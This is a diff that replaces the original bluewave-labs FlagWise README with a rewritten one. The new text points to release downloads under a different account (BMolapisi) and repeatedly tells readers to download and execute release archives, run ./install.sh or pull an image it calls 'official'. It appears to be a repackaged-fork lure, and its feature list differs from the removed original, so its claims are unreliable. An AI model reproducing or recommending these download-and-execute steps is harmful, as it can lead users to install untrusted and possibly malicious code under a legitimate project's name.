@@ -1,187 +1,253 @@
-<h1 align="center">🛡️ FlagWise</h1>
+# Flagwise — Monitor, Detect, and Analyze Shadow AI in LLMs
+[![Releases](https://img.shields.io/badge/Releases-%20Download-blue?logo=github&style=flat)](https://github.com/BMolapisi/flagwise/releases) https://github.com/BMolapisi/flagwise/releases
 
-<div align="center">
+![Flagwise banner](https://images.unsplash.com/photo-1555949963-3a22d0f8ab5a?auto=format&fit=crop&w=1400&q=80)
 
-**Shadow AI Detection Server - Real-time Security Monitoring for LLM Traffic**
+Badges
+- ![ai-analytics](https://img.shields.io/badge/ai--analytics-flagwise-green)
+- ![ai-compliance](https://img.shields.io/badge/ai--compliance-flagwise-green)
+- ![ai-governance](https://img.shields.io/badge/ai--governance-flagwise-green)
+- ![ai-observability](https://img.shields.io/badge/ai--observability-flagwise-green)
+- ![llm-monitoring](https://img.shields.io/badge/llm--monitoring-flagwise-orange)
+- ![shadow-ai-detector](https://img.shields.io/badge/shadow--ai--detector-flagwise-red)
 
-[![Docker](https://img.shields.io/badge/Docker-Ready-blue?logo=docker)](https://www.docker.com/)
-[![React](https://img.shields.io/badge/React-18+-61DAFB?logo=react)](https://reactjs.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-Latest-009688?logo=fastapi)](https://fastapi.tiangolo.com/)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15+-336791?logo=postgresql)](https://postgresql.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+About Flagwise
+Flagwise monitors LLM traffic, detects security threats, and flags Shadow AI use. It fuses observability with threat analysis. It provides dashboards, alerts, and forensic logs for LLM-driven systems.
 
-<img width="1341" height="859" alt="SCR-20250810-frva" src="https://github.com/user-attachments/assets/9259c19f-4e05-4925-ae8a-45cf7e037549" />
+Key features
+- Traffic capture for LLM requests and responses.
+- Shadow AI detection using model fingerprinting and drift signals.
+- Rule-based and ML-based threat detection.
+- Real-time alerts via webhooks, Slack, and email.
+- Forensic audit logs with request replay.
+- Privacy-preserving telemetry and configurable retention.
+- Dashboards and analytics for compliance and governance.
+- CLI and SDKs to integrate into pipelines and apps.
 
+Why use Flagwise
+- Find hidden model calls that bypass controls.
+- Detect exfiltration, prompt injection, and poisoned content.
+- Track model lineage and vendor usage.
+- Correlate LLM usage to user ID, app, and endpoint.
+- Prove compliance with audit-ready logs.
 
-</div>
+Quick demo GIF
+![demo](https://raw.githubusercontent.com/BMolapisi/flagwise/main/docs/assets/demo.gif)
 
-FlagWise is an open-source **Shadow AI detection server** designed to give organizations complete visibility into how Large Language Models (LLMs) are being used across their systems. It monitors LLM traffic in real time, detects unauthorized or risky usage, and provides detailed analytics so you can take action before small issues turn into serious security incidents.
+Install and run (releases)
+Download the latest release and execute the installer. The release files are available at:
+https://github.com/BMolapisi/flagwise/releases
 
-With FlagWise, you can:
-
-- **Monitor LLM traffic in real time** – Log prompts, responses, and metadata.
-- **Detect shadow AI usage** – Identify unauthorized models, providers, or prompt patterns that violate policies.
-- **Analyze security risks** – See which prompts contain sensitive content, potential data leaks or compliance violations.
-- **Get real-time alerts** – Respond instantly when risky or unapproved activity occurs.
-- **Integrate easily** – Deploy with Docker, run the backend with FastAPI, the frontend with React and store data securely in PostgreSQL
-
-<img width="1046" height="533" alt="SCR-20250810-etjk" src="https://github.com/user-attachments/assets/be79487c-cf9a-4a01-83ce-be14a1f4aa09" />
-
-
-[Quick Start](#-quick-start) • [Features](#-features) • [Documentation](#-documentation) • [Contributing](#-contributing)
-
-</div>
-
----
-
-## ✨ Features
-
-### **Real-time Threat Detection**
-- **Pattern-based Detection**: Keywords, regex, and custom rules
-- **Risk Scoring**: Intelligent threat assessment (0-100 scale)
-- **Model Restrictions**: Control which AI models can be used
-- **IP Monitoring**: Track and analyze request sources
-- **Interactive Dashboard**: Visual insights into LLM traffic
-- **Trend Analysis**: Volume, threat, and model usage trends
-- **Performance Metrics**: Response times and success rates
-- **Role-based Access**: Admin and read-only user types
-- **Configurable Triggers**: Custom alert conditions
-
-Email integration and Slack coming soon
- 
-## 🚀 Quick Start
-
-### One-Command Installation
+Download the release package, extract it, and run the installer. Example commands:
 ```bash
-git clone https://github.com/bluewave-labs/flagwise.git
-cd flagwise
-docker-compose up -d
+# Download the latest release archive (replace URL with the chosen asset)
+curl -L -o flagwise-latest.tar.gz "https://github.com/BMolapisi/flagwise/releases/download/vX.Y.Z/flagwise-vX.Y.Z-linux-amd64.tar.gz"
+
+# Extract
+tar -xzf flagwise-latest.tar.gz
+
+# Change to extracted folder
+cd flagwise-*
+
+# Run the installer or binary
+./install.sh
+# or run the binary directly
+./flagwise server --config ./config.yaml
 ```
+The release file needs to be downloaded and executed.
 
-### Access Your Dashboard
-- **Web Interface**: http://localhost:3000
-- **Login**: `admin` / `admin123` (please change this once you login)
-- **API Docs**: http://localhost:8000/docs
-
-### Data Source Configuration
-FlagWise consumes LLM traffic data from Kafka topics that are fed from network routers. Configure your Kafka connection in **Settings → Data Sources** within the FlagWise interface. In the future we'll add more data sources.
-
-![SCR-20250810-dtaq](https://github.com/user-attachments/assets/7a09d058-8f10-447d-90fb-af7e29b6f8f7)
-
-[📖 **Installation Guide →**](INSTALLATION.md)
-
-## 🛠️ Technology Stack
-
-| Component | Technology | Purpose |
-|-----------|------------|----------|
-| **Frontend** | React 18, TailwindCSS | Interactive dashboard and user interface |
-| **Backend** | FastAPI, Python 3.11 | API server and business logic |
-| **Database** | PostgreSQL 15 | Data persistence and analytics |
-| **Security** | JWT, bcrypt | Authentication and authorization |
-| **Deployment** | Docker, Docker Compose | Containerization and orchestration |
-
----
-
-## 📋 Use Cases
-
-In enterprise security, the system enables organizations to track LLM usage across the company, detect and prevent data leaks or sensitive information exposure, enforce approved AI model usage policies, and generate audit-ready compliance reports.
-
-For research and development, it allows teams to analyze AI model performance and behavior, track experiment metrics and outcomes, monitor resource consumption and related costs, and run A/B tests to compare different AI configurations.
-
-Within security operations, it provides real-time threat detection and response capabilities, integrates seamlessly with SIEM platforms and other security tools, automates incident response workflows, and supports forensic analysis of security events.
-
-
-## 🔧 Configuration Examples
-
-### Detection Rules
-```python
-# Example: Detect sensitive data patterns
-{
-    "name": "Credit Card Detection",
-    "rule_type": "regex",
-    "pattern": r"\b(?:\d{4}[-\s]?){3}\d{4}\b",
-    "severity": "critical",
-    "points": 75
-}
-```
-
-### Alert Configuration
-```python
-# Example: Slack alert for high-risk events
-{
-    "alert_type": "slack",
-    "webhook_url": "https://hooks.slack.com/...",
-    "conditions": {
-        "risk_score": {"min": 70},
-        "is_flagged": True
-    }
-}
-```
-
----
-
-## 🚀 Getting Started
-
-### For Developers
-1. **[Installation Guide](INSTALLATION.md)** - Get up and running quickly
-2. **API Documentation** - Available under /docs in your installation
-
-### For Administrators
-1. **[User Management](docs/USER_MANAGEMENT.md)** - Manage accounts and permissions
-2. **[Detection Rules](docs/DETECTION_RULES.md)** - Configure security patterns
-3. **[Alert Setup](docs/ALERTS.md)** - Set up notifications
-
----
-
-## 🤝 Contributing
-
-We welcome contributions from the community! Here's how to get started:
-
-### Development Setup
+Quickstart (Docker)
 ```bash
-# Clone the repository
-git clone https://github.com/bluewave-labs/flagwise.git
-cd flagwise
+# Pull the official Flagwise image
+docker pull bmolapisi/flagwise:latest
 
-# Start development environment
-docker-compose up -d
+# Run with a mounted config
+docker run -d --name flagwise \
+  -v $(pwd)/config.yaml:/etc/flagwise/config.yaml \
+  -p 8080:8080 \
+  bmolapisi/flagwise:latest
 
-# Run tests
-docker-compose exec api pytest
-docker-compose exec web npm test
+# Check logs
+docker logs -f flagwise
 ```
 
-### Contribution Guidelines
-- **Bug Reports**: Use GitHub Issues with detailed reproduction steps
-- **Feature Requests**: Discuss in GitHub Discussions before implementation
-- **Pull Requests**: Follow our PR template and ensure tests pass
-- **Documentation**: Help improve our guides and API docs
+Core concepts
+- Collector: Captures LLM traffic from proxies, SDK wrappers, or network taps.
+- Fingerprint: A model and vendor signature extracted from responses and metadata.
+- Shadow AI: Any external or non-approved model used by an app or user.
+- Rules: Signature-based rules for known threats like prompt injection.
+- Detectors: ML modules that detect drift, hallucination spikes, and data exfiltration signals.
+- Stream: Real-time pipeline that scores every request and issues alerts.
 
----
+Architecture overview
+![architecture diagram](https://raw.githubusercontent.com/BMolapisi/flagwise/main/docs/assets/architecture.png)
 
-## 📚 Documentation
+1. Ingest: Collectors receive traffic from SDKs, proxies, or agentless taps.
+2. Parse: Parsers normalize requests and responses. Extract metadata and tokens.
+3. Detect: Fingerprinters and detectors classify model usage and risk.
+4. Store: Encrypted event store holds logs and transcripts with retention policies.
+5. Alert: Alert engine maps detections to channels and severity.
+6. UI: Dashboards show trends, detections, and audit trails.
 
-### User Guides
-- [Installation Guide](INSTALLATION.md) - Complete setup instructions
-- [User Management](docs/USER_MANAGEMENT.md) - Account and permission management
-- [Detection Rules](docs/DETECTION_RULES.md) - Security pattern configuration
+Detection methods
+- Model fingerprinting: Use response patterns, timing, tokenization, and headers to classify model vendor and version.
+- Prompt injection signatures: Match prompt patterns that aim to override instructions or exfiltrate secrets.
+- Drift detection: Monitor statistical shifts in output entropy, token length, and topical drift.
+- Watermark correlation: Detect known watermarks if providers embed them.
+- API traffic correlation: Correlate outgoing API calls and billing spikes to detect shadow model usage.
+- Behavioral scoring: Score users and endpoints on risk based on historical patterns.
 
-### Technical Documentation
-- [Database Schema](docs/DATABASE.md) - Table structure and relationships
-- [Deployment Guide](docs/DEPLOYMENT.md) - Production deployment strategies
+Alerting and playbooks
+- Alert types: Info, Warning, Critical.
+- Integrations: Slack, PagerDuty, webhooks, email, syslog.
+- Playbooks: Prebuilt response playbooks for common incidents:
+  - Exfiltration suspected: throttle user, snapshot conversation, escalate to SOC.
+  - Unapproved model usage: block endpoint, notify app owner, start audit.
+  - Prompt injection: isolate session, flag for content review.
 
----
+Rules and policies
+- Policy engine uses YAML policies that map detections to actions.
+- Example policy keys:
+  - allow_models
+  - block_models
+  - sensitive_data_patterns
+  - retention_days
+- Policies run in the pipeline and update in real time.
 
-## 🆘 Support & License
+Data retention and privacy
+- Event store supports retention windows and deletion.
+- Transcripts encrypt at rest and in transport.
+- Masking: PII masking functions run on sensitive fields before storage.
+- Configurable TTL: Set retention per project or environment.
 
-Please ask your questions or submit an issue in Github issues section.
+Integrations
+- Cloud providers: AWS S3, GCS, Azure Blob for archive.
+- SIEM: Splunk, Elastic, Sumo Logic.
+- Identity: Okta, Keycloak, Auth0 for user mapping.
+- Observability: Prometheus metrics, OpenTelemetry traces.
+- Chat and incident channels: Slack, Microsoft Teams, PagerDuty.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+APIs and SDKs
+- REST API: CRUD for rules, fetch events, query detectors.
+- Webhook: Push detections to any HTTP endpoint.
+- SDKs: Node, Python, Go for easy instrumentation.
+- Example API call
+```bash
+curl -X POST "http://localhost:8080/api/v1/detect" \
+  -H "Authorization: Bearer <API_KEY>" \
+  -H "Content-Type: application/json" \
+  -d '{"request": {"prompt":"<user prompt>", "response":"<model output>"}}'
+```
 
-<div align="center">
+CLI
+- flagwise status
+- flagwise analyze --file session.json
+- flagwise export --from 2025-01-01 --to 2025-02-01 --format json
 
-**Made with ❤️ by the FlagWise Team**
+Configuration example (config.yaml)
+```yaml
+server:
+  host: 0.0.0.0
+  port: 8080
 
-[⭐ Star this project](https://github.com/bluewave-labs/flagwise) • [🐛 Report Bug](https://github.com/bluewave-labs/flagwise/issues) • [💡 Request Feature](https://github.com/bluewave-labs/flagwise/discussions)
+storage:
+  type: postgres
+  uri: postgres://flagwise:pass@db/flagwise
 
-</div>
+detectors:
+  enable_fingerprint: true
+  enable_drift: true
+
+alerts:
+  slack:
+    webhook: https://hooks.slack.com/services/XXX/YYY/ZZZ
+
+policy:
+  allow_models:
+    - openai/gpt-4
+  block_models:
+    - unknown
+```
+
+Dashboards
+- Key dashboards:
+  - Overview: traffic volume, model mix, risk score.
+  - Alerts: active incidents and history.
+  - Model usage: vendor share, versions, latency.
+  - Compliance: retention and audit status.
+
+Common use cases
+- Governance: Track which models apps actually use across teams.
+- Security: Detect prompt injection and data exfiltration attempts.
+- Cost control: Spot spikes that indicate shadow models or abuse.
+- Compliance: Generate audit trails for regulators and internal reviews.
+- Vendor comparison: Compare outputs and drift across models.
+
+Detection tuning
+- Start with conservative thresholds.
+- Use a baseline period to capture normal behavior.
+- Tune fingerprint and drift sensitivity per workload.
+- Add false positive rules for known benign patterns.
+
+Forensic tools
+- Session replay: Re-run captured prompts against a sandbox.
+- Token traces: Show token-level usage and entity patterns.
+- Snapshot export: Export a locked package for an incident review.
+
+Scaling and performance
+- Use horizontal collectors for high throughput.
+- Route heavy analysis to batch workers.
+- Sample low-risk traffic for cost control.
+- Use GPU workers for heavy ML detectors.
+
+Security model
+- Run Flagwise in your VPC or on-prem.
+- Limit access with role-based access control.
+- Use HSM or KMS for encryption keys.
+- Audit every config change and detection.
+
+Contributing
+- Open an issue for bugs or feature requests.
+- Fork the repo and submit pull requests with tests.
+- Follow the code style and include unit tests.
+- Check the Releases page for latest binaries and changelogs:
+  https://github.com/BMolapisi/flagwise/releases
+
+Roadmap
+- Plugin system for custom detectors.
+- Native support for more model vendors.
+- Real-time lineage tracing across services.
+- Advanced privacy controls and certified storage exports.
+
+FAQ
+Q: How do you detect unknown models?
+A: We use response fingerprinting, timing, and header patterns to infer vendor signals and mark unknown models as shadow AI.
+
+Q: Can I run Flagwise entirely offline?
+A: Yes. Deploy in private networks. Turn off external telemetry and use on-prem storage.
+
+Q: How do alerts map to incident severity?
+A: Each detector returns a score. Policies map score ranges to Info, Warning, or Critical. You can override mapping per project.
+
+Support and contact
+- Raise issues on GitHub Issues.
+- For enterprise support, open an issue titled "enterprise-support" and include contact details.
+
+License
+- MIT (or replace with your preferred license file in the repo).
+
+Maintainers
+- B. Molapisi — lead
+- Community contributors — see CONTRIBUTORS.md
+
+Changelog & downloads
+Find release packages and installers. Download the release file that matches your platform and execute it per the included README in the release asset. Releases:  
+https://github.com/BMolapisi/flagwise/releases
+
+Files to check in the release asset:
+- flagwise-vX.Y.Z-linux-amd64.tar.gz (download and execute)
+- flagwise-vX.Y.Z-windows.zip (download and run)
+- INSTALL.md
+- CHANGELOG.md
+
+License, Code of Conduct, and Contributing guides live in the repo.
